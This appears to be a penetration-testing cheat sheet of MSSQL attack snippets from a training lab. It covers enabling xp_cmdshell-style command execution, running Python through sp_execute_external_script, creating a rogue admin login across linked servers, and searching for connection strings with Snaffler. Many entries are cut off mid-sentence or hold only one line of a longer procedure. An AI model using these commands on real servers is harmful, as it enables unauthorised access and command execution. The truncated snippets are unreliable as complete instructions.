# MSSQL

% mssql, sqlcmd, cpts

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - enumeration
#cat/ATTACK #cpts
Local users

```
msf6 > use auxiliary/admin/mssql/mssql_enum_domain_accounts
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - execute-commands
#cat/ATTACK #cpts
Command execution is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute

```
(2 rows affected)
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - scripts-2
#cat/ATTACK #cpts
If it returns run_value = 1, it's enabled. If not, and you have sysadmin, you can try to enable it:

```
EXEC sp_configure 'external scripts enabled', 1
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - scripts-3
#cat/ATTACK #cpts
It turns out that when a webserver is enabled to run the stored procedure sp_execute_external_script, and that it is configured to do that as a different user. To run script, the syntax is relatively simple:

```
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");'
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - write-file---enable-ole-automation-procedures
#cat/ATTACK #cpts
To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

```
sp_configure 'show advanced options', 1
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - write-file---enable-ole-automation-procedures-2
#cat/ATTACK #cpts
Create the file

```
DECLARE @OLE INT
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - identifying-linked-servers
#cat/ATTACK #cpts
Creation d'un user admin sur mssql pour éviter de bounce entre les serveurs

```
SQL> EXECUTE('EXECUTE(''CREATE LOGIN df WITH PASSWORD = ''''qwe123QWE!@#'''';'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - mssql-2
#cat/ATTACK #cpts
```
sqlcmd -S 10.129.20.13 -U username -P Password123
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - enumerating-mssql-instances-with-powerupsql
#cat/ATTACK #cpts
Privileged Access

```
ComputerName : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - enumerating-mssql-instances-with-powerupsql-2
#cat/ATTACK #cpts
We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are

```
VERBOSE: 172.16.5.150,1433 : Connection Success.
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - sqlcmd---connecting-to-the-sql-server
#cat/ATTACK #cpts
**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance. If we ar

```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - sqlcmd---connecting-to-the-sql-server-2
#cat/ATTACK #cpts
**Note:** When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look. When using Windows Authentication, we need to specify the domain name or the hostname

```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - mssql---enable-ole-automation-procedures
#cat/ATTACK #cpts
Attacking SQL Databases

```
1> sp_configure 'show advanced options', 1
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - mssql---create-a-file
#cat/ATTACK #cpts
Attacking SQL Databases

```
1> DECLARE @OLE INT
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - locate-a-configuration-file-containing-an-mssql-connection-string-what
#cat/ATTACK #cpts
From the newly created PowerShell session, students to run `Snaffler.exe` to find a SQL connection string in a web.config file:

```
cd C:\users\AB920\Desktop
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - locate-a-configuration-file-containing-an-mssql-connection-string-what-2
#cat/ATTACK #cpts
From the newly created PowerShell session, students to run `Snaffler.exe` to find a SQL connection string in a web.config file:

```
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

## MSSQL - MSSQL - MSSQL - MSSQL - MSSQL - confirming-access
#cat/ATTACK #cpts
With this access, we can confirm that we are indeed running in the context of a SQL Server service account.

```
SQL> xp_cmdshell whoami
```

